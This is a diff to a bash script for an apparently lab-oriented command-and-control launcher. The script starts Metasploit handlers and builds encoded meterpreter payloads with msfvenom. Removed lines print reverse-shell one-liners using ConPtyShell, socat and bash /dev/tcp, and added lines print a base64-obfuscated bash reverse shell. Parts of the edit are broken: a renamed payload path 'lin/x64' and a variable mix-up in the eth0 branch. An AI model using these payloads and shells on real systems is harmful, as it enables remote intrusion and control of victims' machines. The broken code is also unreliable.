@@ -6,6 +6,7 @@ script_path="$(dirname \"$0\")"
 # Configuration
 
 ports=(1100)
+rev_port=1100 # used for shell template
 primary_ip=10.10.14.17
 
 uuid_length=3
@@ -27,6 +28,8 @@ _show_banner() {
 _launch() {
     if [[ $(tmux -S $bc2socket ls) != *created* ]]; then
         echo "starting bc2..."
+        which socat || echo "socat not installed.. exit"
+        which socat || exit
         _start_server
     else
         echo "bc2 is running, attaching..."
@@ -43,8 +46,6 @@ _start_server() {
     tmux -S $bc2socket split-window    -t bc2_cmd
     tmux -S $bc2socket split-window -h -t bc2_cmd:C2.1
 
-
-    
     tmux -S $bc2socket send-keys       -t bc2_cmd:C2.3 "clear;tail -f -n 60 $bc2_dir/bc2log" ENTER
     sleep 0.5
     tmux -S $bc2socket clear-history   -t bc2_cmd:C2.3
@@ -209,7 +210,7 @@ _add_meterpreter_listener() {
     tmux -S $bc2socket send-keys  -t bc2_cmd:META 'msfconsole -x "use exploits/multi/handler; set lhost 0.0.0.0;  set lport 1103; set payload windows/meterpreter_reverse_tcp; set ExitOnSession false; exploit -j"; echo "Linux pl: linux/x64/meterpreter_reverse_tcp | Python pl: python/meterpreter_reverse_tcp"'
 
     tmux -S $bc2socket split-window -t bc2_cmd:META
-    tmux -S $bc2socket send-keys  -t bc2_cmd:META 'msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.17 LPORT=1103 -f exe -o $pl/windows/agent/meterp.exe -e x86/shikata_ga_nai; msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=1103 -f elf -o $pl/linux/agent/meterp.elf; msfvenom -p python/meterpreter_reverse_tcp LHOST=10.10.14.14 LPORT=1103 -o $pl/linux/agent/meterp.py; echo "Invoke-WebRequest -Uri http://10.10.14.5:1111/windows/agent/meterp.exe -OutFile meterp.exe"' 
+    tmux -S $bc2socket send-keys  -t bc2_cmd:META 'msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.17 LPORT=1103 -f exe -o $pl/windows/agent/meterp.exe -e x86/shikata_ga_nai; msfvenom -p lin/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=1103 -f elf -o $pl/lin/agent/meterp.elf; msfvenom -p python/meterpreter_reverse_tcp LHOST=10.10.14.14 LPORT=1103 -o $pl/lin/agent/meterp.py; echo "Invoke-WebRequest -Uri http://10.10.14.5:1111/windows/agent/meterp.exe -OutFile meterp.exe"' 
 }
 
 _add_posh_listener() {
@@ -290,18 +291,23 @@ _sysinfo_windows() {
 #===================================================================================
 
 _show_shells() {
-    printf "\nShells:\n\n"
-    echo "Windows: ConptyShell"
-    echo "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $1 $2"
-    echo "-------------"
-    echo "Socat"
-    echo "socat -d -d TCP4:$1:$2 EXEC:/bin/bash"
-    echo "-------------"
-    echo "Linux: Bash"
-    echo "bash -c \"bash -i >/dev/tcp/$1/$2 0>&1\""
-    echo "-------------"
     printf "\nIP Address: \n"
     nmcli -p device show | grep -e IP4.ADD -e Device | grep -o '^[^\/]*' | awk 'NF>1{print $NF}' | paste - - | column -t | grep -v "(lo)\|(docker0)"
+    printf "RevShells: https://www.revshells.com/"
+    printf "\nLinux RevShell (Port: $rev_port) "
+    if ifconfig | grep tun0 -q; then
+      printf "tun0:\n"
+      ref_if=$(ifconfig tun0 | grep "inet " | cut -d" " -f10)
+      rev_shell="bash -i >& /dev/tcp/$ref_if/$rev_port 0>&1"
+      rev_b64=$(echo $rev_shell | base64)
+      echo echo $rev_b64'|base64 -d|bash'
+    else
+      printf "eth0:\n"
+      rev_if=$(ifconfig eth0 | grep "inet " | cut -d" " -f10)
+      rev_shell="bash -i >& /dev/tcp/$ref_if/$rev_port 0>&1"
+      rev_b64=$(echo $rev_shell | base64)
+      echo echo $rev_b64'|base64 -d|bash'
+    fi
 }
 
 #===================================================================================
